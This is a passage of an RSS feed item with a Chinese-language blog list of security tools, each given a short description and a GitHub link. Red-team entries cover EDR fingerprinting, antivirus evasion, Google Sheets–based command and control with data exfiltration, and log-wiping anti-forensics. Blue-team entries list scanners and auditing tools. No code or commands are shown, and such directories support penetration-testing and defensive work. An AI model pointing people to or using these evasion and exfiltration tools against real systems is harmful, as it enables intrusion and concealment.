&lt;p&gt;由于 Windows 市场上提供了大量端点检测和响应系统 (EDR) 和防病毒解决方案，因此在红队操作期间，迫切需要在目标端点上对这些已安装的解决方案进行指纹识别。事实证明，这些信息对于定制自定义漏洞利用和攻击技术以成功渗透和对目标进行操作至关重要。EDRHunt 是一个实用程序，可通过查询服务、驱动程序、运行进程和注册表项来扫描和识别 Windows 端点上已安装的 EDR 和 AV。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0ZvdXJDb3JlTGFicy9FRFJIdW50&#34;&gt;https://github.com/FourCoreLabs/EDRHunt&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;viper&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#viper&#34;&gt;#&lt;/a&gt; Viper&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Viper (炫彩蛇) 是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化，集成杀软绕过，内网隧道，文件管理，命令行等基础功能，当前已集成 70 + 个模块，覆盖初始访问 / 持久化 / 权限提升 / 防御绕过 / 凭证访问 / 信息收集 / 横向移动等大类，目标是帮助红队工程师提高攻击效率，简化操作，降低技术门槛，支持在浏览器中运行原生 msfconsole, 且支持多人协作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Z1bm55V29sZi9WaXBlcg==&#34;&gt;https://github.com/FunnyWolf/Viper&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;蓝队工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#蓝队工具&#34;&gt;#&lt;/a&gt; 蓝队工具&lt;/h1&gt;
&lt;h2 id=&#34;web-log-parser-web日志工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-log-parser-web日志工具&#34;&gt;#&lt;/a&gt; web-log-parser - web 日志工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;web-log-parser&lt;/strong&gt; 为开源的分析 web 日志工具，采用 python 语言开发，具有灵活的日志格式配置。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0plZmZYdWUvd2ViLWxvZy1wYXJzZXI=&#34;&gt;https://github.com/JeffXue/web-log-parser&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;rkhunter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rkhunter&#34;&gt;#&lt;/a&gt; RKHunter&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;RKHunter 是专业检测系统是否感染 rootkit 的工具，通过执行一系列脚本来确定服务器是否感染 rootkit。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5yb290a2l0Lm5sL3Byb2plY3RzL3Jvb3RraXRfaHVudGVyLmh0bWw=&#34;&gt;http://www.rootkit.nl/projects/rootkit_hunter.html&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;duckmemoryscan-内存马免杀马查杀工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#duckmemoryscan-内存马免杀马查杀工具&#34;&gt;#&lt;/a&gt; DuckMemoryScan - 内存马免杀马查杀工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一个简单寻找包括不限于 iis 劫持，无文件木马，shellcode 免杀后门的工具，由 huoji 花了 1 天编写，编写时间 2021-02-24 !&lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt; 本程序需要 64 位编译才能回溯 x64 的程序堆栈，请勿执行 32 位编译&lt;/span&gt;！!&lt;span class=&#34;spoiler&#34; title=&#34;你知道的太多了&#34;&gt; 本工具不能代替杀毒软件&lt;/span&gt;！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2h1b2ppMTIwL0R1Y2tNZW1vcnlTY2Fu&#34;&gt;https://github.com/huoji120/DuckMemoryScan&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;pchunter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pchunter&#34;&gt;#&lt;/a&gt; PCHunter&lt;/h2&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;PCHunter是一款知名的Windows系统底层反内核工具，系统信息检测工具、手工杀毒工具、系统安全辅助工具。这款ARK工具有内核级驱动检测、内核对象劫持、Hook 、MBR Rootkit、文件管理、进程管理、启动项管理、注册表管理、服务管理、驱动模块、网络管理、系统内核查看、应用层钩子、系统修复等功能。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54dWV0ci5jb20v&#34;&gt;http://www.xuetr.com/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;openvas-漏洞评估系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#openvas-漏洞评估系统&#34;&gt;#&lt;/a&gt; OpenVAS - 漏洞评估系统&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;OpenVAS 是开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cub3BlbnZhcy5vcmcv&#34;&gt;https://www.openvas.org/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;pestudio&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pestudio&#34;&gt;#&lt;/a&gt; PeStudio&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;PeStudio 是一款独特的工具，执行静态校验 32 位和 64-bit 为的可执行文件。PEStudio 针对个人非商业用途是免费的。恶意可执行程序通常隐藏其恶意行为，避免被查出。因此，恶意程序通常呈现存在异常并且可疑的状态。PEStudio 的目标就是检测这些异常，评估被分析的可执行文件的可信度。由于这些被分析的可执行文件并没有执行，你可以无风险的检测未知以及恶意的可执行文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cud2luaXRvci5jb20v&#34;&gt;https://www.winitor.com/&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
&lt;h2 id=&#34;savior&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#savior&#34;&gt;#&lt;/a&gt; Savior&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;渗透测试报告自动生成工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL011c3RhcmQ0MDQvU2F2aW9y&#34;&gt;https://github.com/Mustard404/Savior&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;moonwalk-linux系统日志清除工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#moonwalk-linux系统日志清除工具&#34;&gt;#&lt;/a&gt; Moonwalk - Linux 系统日志清除工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;moonwalk 是一个 400 KB 的单二进制可执行文件，可以在渗透测试 Unix 机器时清除您的痕迹。它保存系统日志开发前的状态，并恢复该状态，包括开发后的文件系统时间戳，在 shell 中留下零幽灵的痕迹。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL211ZmVlZHZoL21vb253YWxrLw==&#34;&gt;https://github.com/mufeedvh/moonwalk/&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;渗透测试工具集合&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#渗透测试工具集合&#34;&gt;#&lt;/a&gt; 渗透测试工具集合&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这是我多年来为渗透测试和 IT 安全审计目的而开发的&lt;strong&gt; 160 多种&lt;/strong&gt;工具，脚本，备忘单和其他战利品的集合。在我的现实世界中，它们中的大多数至少派上了用场一次。&lt;br /&gt;
该系列进一步分为以下几个部分：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;clouds&lt;/code&gt; - 我在云评估期间想到的工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file-formats&lt;/code&gt; - 文件格式相关的实用程序，模糊器等。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;linux&lt;/code&gt; - 一小堆基于 Linux 的脚本和工具。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;networks&lt;/code&gt; - 网络设备和协议渗透测试工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;others&lt;/code&gt; - 其他与这种工艺有关&lt;/li&gt;
&lt;li&gt;&lt;code&gt;phishing&lt;/code&gt; - 用于提供网络钓鱼意识和红队模拟的脚本和工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;red-teaming&lt;/code&gt; - 我在紫色 / 红色团队活动期间一直在使用的许多工具&lt;/li&gt;
&lt;li&gt;&lt;code&gt;web&lt;/code&gt; - Web 应用程序安全评估相关实用程序。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;windows&lt;/code&gt; - Windows 好东西，脚本，漏洞利用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21nZWVreS9QZW5ldHJhdGlvbi1UZXN0aW5nLVRvb2xz&#34;&gt;https://github.com/mgeeky/Penetration-Testing-Tools&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;掩日-适用于红队的综合免杀工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#掩日-适用于红队的综合免杀工具&#34;&gt;#&lt;/a&gt; 掩日 - 适用于红队的综合免杀工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;掩日是一款适用于红队的综合免杀工具，其中包括有：通用免杀、本地分离、网络分离等多种免杀方式和杀软识别等功能，至于免杀效果还行自行测试。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzF5MG4vQVZfRXZhc2lvbl9Ub29s&#34;&gt;https://github.com/1y0n/AV_Evasion_Tool&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;cloud-bucket-leak-detection-tools&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cloud-bucket-leak-detection-tools&#34;&gt;#&lt;/a&gt; Cloud-Bucket-Leak-Detection-Tools&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阿里云、腾讯云等泄露利用检测工具&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1V6SnUvQ2xvdWQtQnVja2V0LUxlYWstRGV0ZWN0aW9uLVRvb2xz&#34;&gt;https://github.com/UzJu/Cloud-Bucket-Leak-Detection-Tools&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;thundersearch-gui图形化渗透测试信息搜集工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#thundersearch-gui图形化渗透测试信息搜集工具&#34;&gt;#&lt;/a&gt; ThunderSearch - GUI 图形化渗透测试信息搜集工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;调用 ZoomEye 的官方 api，结合开发文档，开发的 GUI 界面的信息搜集工具。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3h6YWp5anMvVGh1bmRlclNlYXJjaA==&#34;&gt;https://github.com/xzajyjs/ThunderSearch&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;lynis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lynis&#34;&gt;#&lt;/a&gt; Lynis&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lynis&lt;/strong&gt; 是一款 Unix 系统的安全审计以及加固工具，能够进行深层次的安全扫描，其目的是检测潜在的时间并对未来的系统加固提供建议。这款软件会扫描一般系统信息，脆弱软件包以及潜在的错误配置。扫描完成后，Lynis 还会为我们生成一份包含所有扫描结果的安全报告。&lt;br /&gt;
Lynis 是 Unix/Linux 系统用于软件补丁管理，恶意软件扫描和漏洞检测的最值得信赖的自动化审计工具之一。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0NJU09meS9seW5pcw==&#34;&gt;https://github.com/CISOfy/lynis&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;gc2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#gc2&#34;&gt;#&lt;/a&gt; GC2&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;GC2 是一款功能强大的命令控制应用工具，该工具将允许广大安全研究人员或渗透测试人员使用 Google Sheet 来在目标设备上执行远程控制命令，并使用 Google Drive 来提取目标设备中的敏感数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2xvb0NpcHJpYW4vR0MyLXNoZWV0&#34;&gt;https://github.com/looCiprian/GC2-sheet&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;moonwalk&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#moonwalk&#34;&gt;#&lt;/a&gt; moonwalk&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;通过在系统日志和文件系统时间戳上留下零痕迹，在 Linux 漏洞利用 / 渗透测试期间覆盖您的踪迹。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL211ZmVlZHZoL21vb253YWxr&#34;&gt;https://github.com/mufeedvh/moonwalk&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;spacecore-集成化渗透测试工具&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spacecore-集成化渗透测试工具&#34;&gt;#&lt;/a&gt; SpaceCore - 集成化渗透测试工具&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;一个简单的集成化渗透测试工具，该工具在于帮助您更好的完成渗透测试&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0Vyb3Npb24yMDIwL1NwYWNlQ29yZQ==&#34;&gt;https://github.com/Erosion2020/SpaceCore&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
